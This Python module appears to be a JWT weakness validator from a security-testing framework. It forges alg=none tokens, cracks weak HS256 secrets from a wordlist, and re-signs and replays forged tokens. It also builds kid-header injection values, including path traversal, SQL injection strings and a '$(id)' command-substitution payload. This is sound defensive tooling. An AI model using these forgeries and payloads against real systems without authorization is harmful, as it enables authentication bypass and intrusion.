"""JWT weakness validator (R7).

Tests for common JWT implementation flaws:
- ``alg=none`` token acceptance.
- Weak HMAC secret (signature cracking) using a small wordlist.
- ``kid`` header injection (path traversal, SQL injection, command injection).
- Algorithm confusion (HS256 verified with public key as secret).

The validator does not require network calls for offline checks; for online
tests, callers should provide a ``jwt_evaluate`` callable that performs the
HTTP round-trip with the validator-supplied token.
"""

from __future__ import annotations

import base64
import json
import logging
from collections.abc import Callable
from typing import Any

from src.core.models import ValidationResult
from src.execution.validators.config.scoring_config import (
    DEFAULT_SCORING_CONFIG,
    ScoringConfig,
)
from src.execution.validators.status import ValidationStatus
from src.execution.validators.validators.shared import (
    bounded_confidence,
    to_validation_result,
)

logger = logging.getLogger(__name__)


def _b64url_decode(value: str) -> bytes:
    padding = "=" * ((4 - len(value) % 4) % 4)
    return base64.urlsafe_b64decode(value + padding)


def parse_jwt(token: str) -> dict[str, Any] | None:
    """Parse a JWT into header/payload/signature segments.

    Returns None if the token does not look like a JWT.
    """
    if not token or not isinstance(token, str):
        return None
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header_bytes = _b64url_decode(parts[0])
        payload_bytes = _b64url_decode(parts[1])
    except (ValueError, TypeError, base64.binascii.Error):  # type: ignore[attr-defined]
        return None
    try:
        header = json.loads(header_bytes.decode("utf-8"))
        payload = json.loads(payload_bytes.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None
    return {"header": header, "payload": payload, "signature_b64": parts[2]}


def detect_alg_none(token: str) -> bool:
    """Return True if the JWT header uses alg=none (case insensitive)."""
    parsed = parse_jwt(token)
    if not parsed:
        return False
    return str(parsed["header"].get("alg", "")).strip().lower() == "none"


def build_alg_none_token(token: str) -> str | None:
    """Rewrite a token's header to alg=none and zero the signature.

    Returns None if the input token cannot be parsed.
    """
    parsed = parse_jwt(token)
    if not parsed:
        return None
    header = dict(parsed["header"])
    header["alg"] = "none"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    return f"{new_header}.{new_payload}."


def _constant_time_compare(a: bytes, b: bytes) -> bool:
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    return result == 0


def sign_jwt_hmac(token: str, secret: str) -> str:
    """Sign a parsed JWT with HS256 and the given secret.

    Used to build candidate tokens for weak-secret testing.
    """
    import hashlib
    import hmac

    parsed = parse_jwt(token)
    if not parsed:
        return ""
    header = dict(parsed["header"])
    header["alg"] = "HS256"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    signing_input = f"{new_header}.{new_payload}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode("ascii")
    return f"{new_header}.{new_payload}.{signature_b64}"


def crack_jwt_secret(
    token: str,
    *,
    candidate_secrets: list[str] | tuple[str, ...] | None = None,
) -> str | None:
    """Return the first secret that produces a matching HS256 signature."""
    parsed = parse_jwt(token)
    if not parsed:
        return None
    sig_b64 = parsed["signature_b64"]
    try:
        expected_signature = _b64url_decode(sig_b64)
    except (ValueError, TypeError, base64.binascii.Error):  # type: ignore[attr-defined]
        return None
    header = dict(parsed["header"])
    header["alg"] = "HS256"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    signing_input = f"{new_header}.{new_payload}".encode("ascii")
    for secret in candidate_secrets or ():
        import hashlib
        import hmac

        signature = hmac.new(
            secret.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        if _constant_time_compare(signature, expected_signature):
            return secret
    return None


def _build_kid_injection_tokens(token: str) -> list[dict[str, str]]:
    """Build candidate ``kid`` injection header values."""
    parsed = parse_jwt(token)
    if not parsed:
        return []
    candidates = [
        ("../../../../dev/null", ""),
        ("/dev/null", ""),
        ("1' OR '1'='1", ""),
        ("' UNION SELECT 'secret' --", ""),
        ("$(id)", ""),
    ]
    tokens: list[dict[str, str]] = []
    for kid_value, _label in candidates:
        header = dict(parsed["header"])
        header["kid"] = kid_value
        header["alg"] = "HS256"
        header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
        payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
        new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
        new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
        tokens.append({"header": new_header, "payload": new_payload, "kid": kid_value})
    return tokens


def evaluate_jwt(
    *,
    token: str,
    scoring: ScoringConfig,
    candidate_secrets: list[str] | tuple[str, ...] | None = None,
    jwt_evaluate: Callable[[str], dict[str, Any]] | None = None,
    kid_evaluate: Callable[[str, str], dict[str, Any]] | None = None,
    in_scope: bool = True,
) -> dict[str, Any]:
    """Evaluate a JWT for common weaknesses.

    Args:
        token: The original JWT to test.
        scoring: Per-validator ``ScoringConfig``.
        candidate_secrets: Wordlist for HS256 cracking.
        jwt_evaluate: Optional callable taking a candidate token string and
            returning ``{"status_code": int, "ok": bool, "body": str}``.
            Used to test the server's response to candidate tokens.
        kid_evaluate: Optional callable taking a candidate token string and
            the kid value used, returning the same response shape. Used to
            test ``kid`` injection.
        in_scope: Whether the target endpoint is in scope.

    Returns:
        Dict with ``status``, ``confidence``, ``signals``, ``evidence``,
        ``bonuses``.
    """
    parsed = parse_jwt(token)
    if not parsed:
        return {
            "status": ValidationStatus.FAILED.value,
            "confidence": 0.0,
            "signals": [],
            "evidence": {"reason": "invalid_jwt"},
            "bonuses": [],
        }

    signals: list[str] = []
    bonuses: list[float] = []
    notes: list[str] = []
    accepted_tokens: list[dict[str, Any]] = []

    # 1) alg=none test.
    none_token = build_alg_none_token(token)
    if none_token and jwt_evaluate is not None and in_scope:
        response = jwt_evaluate(none_token)
        accepted = _response_indicates_acceptance(response, parsed["payload"])
        if accepted:
            signals.append("alg_none_accepted")
            bonuses.append(0.30)
            notes.append("Server accepted alg=none token.")
            accepted_tokens.append(
                {"variant": "alg_none", "response": response, "token": none_token}
            )

    # 2) Weak secret cracking.
    cracked_secret = crack_jwt_secret(token, candidate_secrets=candidate_secrets)
    if cracked_secret:
        signals.append("weak_secret_cracked")
        bonuses.append(0.20)
        notes.append("JWT signature verified with a weak HMAC secret.")
        # Attempt to mint a forged token and replay it.
        forged = sign_jwt_hmac(token, cracked_secret)
        if forged and jwt_evaluate is not None and in_scope:
            response = jwt_evaluate(forged)
            accepted = _response_indicates_acceptance(response, parsed["payload"])
            if accepted:
                signals.append("forged_token_accepted")
                bonuses.append(0.10)
                notes.append("Server accepted forged token signed with weak secret.")
                accepted_tokens.append(
                    {
                        "variant": "forged_weak_secret",
                        "response": response,
                        "token": forged,
                        "secret": cracked_secret,
                    }
                )

    # 3) kid injection.
    for candidate in _build_kid_injection_tokens(token):
        kid_value = candidate.pop("kid")
        token_str = ".".join(candidate.values()) + ".AAAA"
        if kid_evaluate is not None and in_scope:
            response = kid_evaluate(token_str, kid_value)
            accepted = _response_indicates_acceptance(response, parsed["payload"])
            if accepted:
                signals.append("kid_injection")
                bonuses.append(0.18)
                notes.append(f"Server accepted kid injection: {kid_value}")
                accepted_tokens.append(
                    {
                        "variant": "kid_injection",
                        "response": response,
                        "token": token_str,
                        "kid": kid_value,
                    }
                )
                break

    if signals and in_scope and accepted_tokens:
        status = ValidationStatus.CONFIRMED.value
    elif signals and in_scope:
        status = ValidationStatus.HEURISTIC.value
    elif signals:
        status = ValidationStatus.HEURISTIC.value
    else:
        status = ValidationStatus.INCONCLUSIVE.value

    confidence = bounded_confidence(
        base=scoring.base,
        cap=scoring.cap,
        bonuses=bonuses,
    )
    evidence = {
        "header": parsed["header"],
        "payload_keys": sorted(str(key) for key in parsed["payload"].keys()),
        "signals": signals,
        "notes": notes,
        "accepted_tokens": accepted_tokens,
    }
    return {
        "status": status,
        "confidence": confidence,
        "signals": signals,
        "evidence": evidence,
        "bonuses": bonuses,
    }


def _response_indicates_acceptance(
    response: dict[str, Any] | None, original_payload: dict[str, Any]
) -> bool:
    """Best-effort heuristic for "the server accepted the candidate token"."""
    if not response:
        return False
    status_code = int(response.get("status_code", 0) or 0)
    if status_code in (200, 201, 204):
        return True
    if status_code in (401, 403):
        return False
    body = (response.get("body") or "").lower()
    if "invalid" in body or "expired" in body or "unauthorized" in body:
        return False
    if status_code in (302, 303, 307):
        return True
    if status_code >= 500:
        return False
    return False


def validate_jwt_token(
    *,
    token: str,
    target_url: str,
    scoring: ScoringConfig,
    candidate_secrets: list[str] | tuple[str, ...] | None = None,
    jwt_evaluate: Callable[[str], dict[str, Any]] | None = None,
    kid_evaluate: Callable[[str, str], dict[str, Any]] | None = None,
    in_scope: bool = True,
) -> dict[str, Any]:
    """Validate a single JWT and return a result dict."""
    evaluation = evaluate_jwt(
        token=token,
        scoring=scoring,
        candidate_secrets=candidate_secrets,
        jwt_evaluate=jwt_evaluate,
        kid_evaluate=kid_evaluate,
        in_scope=in_scope,
    )
    item = {
        "url": target_url,
        "status": evaluation["status"],
        "confidence": evaluation["confidence"],
        "in_scope": in_scope,
        "scope_reason": "scope_evaluated"
        if in_scope
        else "scope_unavailable_or_out_of_scope",
        "evidence": evaluation["evidence"],
    }
    return to_validation_result(
        item, validator="jwt_weakness", category="jwt_weakness"
    ).__dict__


def validate(target: dict[str, Any], context: dict[str, Any]) -> ValidationResult:
    """R1 facade entry point matching the ``Validator`` Protocol.

    Performs offline-only evaluation (parse + weak-secret crack) so the
    facade never makes HTTP calls. Active probing is performed by the
    engine class ``JwtValidator``.
    """
    token = str(target.get("token") or context.get("token") or "")
    target_url = str(target.get("url", ""))
    candidate_secrets_raw = context.get("jwt_test_secrets")
    if isinstance(candidate_secrets_raw, (list, tuple)) and candidate_secrets_raw:
        candidate_secrets = [str(secret) for secret in candidate_secrets_raw]
    else:
        candidate_secrets = None
    if not token:
        return ValidationResult(
            validator="jwt_weakness",
            category="jwt_weakness",
            url=target_url,
            status=ValidationStatus.FAILED.value,
            confidence=0.0,
            in_scope=bool(context.get("in_scope", True)),
            scope_reason="missing_token",
        )
    evaluation = evaluate_jwt(
        token=token,
        scoring=DEFAULT_SCORING_CONFIG["jwt_weakness"],
        candidate_secrets=candidate_secrets,
        in_scope=bool(context.get("in_scope", True)),
    )
    return ValidationResult(
        validator="jwt_weakness",
        category="jwt_weakness",
        url=target_url,
        status=evaluation["status"],
        confidence=evaluation["confidence"],
        in_scope=bool(context.get("in_scope", True)),
        scope_reason="scope_evaluated",
        evidence=evaluation["evidence"],
    )
